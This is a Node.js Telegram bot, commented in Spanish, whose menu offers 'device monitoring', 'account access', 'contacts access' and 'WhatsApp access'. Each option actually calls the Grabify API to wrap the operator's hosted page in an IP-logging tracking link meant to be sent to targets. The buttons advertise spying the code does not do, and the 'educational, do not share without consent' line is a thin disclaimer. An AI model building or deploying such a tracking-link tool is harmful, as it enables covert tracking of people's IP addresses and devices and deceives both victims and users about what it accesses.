const express = require('express');
const { Telegraf } = require('telegraf');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// El token se lee desde la variable de entorno BOT_TOKEN
const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
  console.error("Falta la variable de entorno BOT_TOKEN");
  process.exit(1);
}
const bot = new Telegraf(BOT_TOKEN);

// ⚠️ CAMBIA ESTA URL POR LA DE TU PÁGINA DE RENDER (la que funciona)
const BASE_URL = 'https://societyy.onrender.com';

// Función para crear enlace acortado con Grabify
async function createGrabifyLink(url) {
  const res = await fetch('https://grabify.link/api/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: url })
  });
  const data = await res.json();
  return data.url;
}

// Comando /menu
bot.command('menu', async (ctx) => {
  const keyboard = {
    inline_keyboard: [
      [{ text: '📍 Monitoreo de Dispositivo', callback_data: 'monitoreo' }],
      [{ text: '👥 Acceso a Cuentas', callback_data: 'cuentas' }],
      [{ text: '👤 Acceso a Contactos', callback_data: 'contactos' }],
      [{ text: '💬 Acceso a WhatsApp', callback_data: 'whatsapp' }],
      [{ text: '❓ Mi Información', callback_data: 'info' }]
    ]
  };
  await ctx.reply('🎯 Selecciona una opción:', { reply_markup: keyboard });
});

// Acción para cada botón
bot.action('monitoreo', async (ctx) => {
  await ctx.answerCbQuery();
  const link = await createGrabifyLink(BASE_URL);
  await ctx.reply(`✅ Enlace generado:\n${link}`);
});
bot.action('cuentas', async (ctx) => {
  await ctx.answerCbQuery();
  const link = await createGrabifyLink(BASE_URL);
  await ctx.reply(`✅ Enlace generado:\n${link}`);
});
bot.action('contactos', async (ctx) => {
  await ctx.answerCbQuery();
  const link = await createGrabifyLink(BASE_URL);
  await ctx.reply(`✅ Enlace generado:\n${link}`);
});
bot.action('whatsapp', async (ctx) => {
  await ctx.answerCbQuery();
  const link = await createGrabifyLink(BASE_URL);
  await ctx.reply(`✅ Enlace generado:\n${link}`);
});
bot.action('info', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('ℹ️ Bot educativo. No compartas enlaces sin consentimiento.');
});

// Comando /start
bot.start(async (ctx) => {
  await ctx.reply('¡Hola! Usa /menu para ver las opciones.');
});

// Servidor web para mantener el bot activo (obligatorio en Render)
app.get('/', (req, res) => res.send('Bot activo'));
app.listen(PORT, () => console.log(`Bot iniciado en puerto ${PORT}`));

// Lanzar el bot
bot.launch();

// Manejar cierre limpio
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
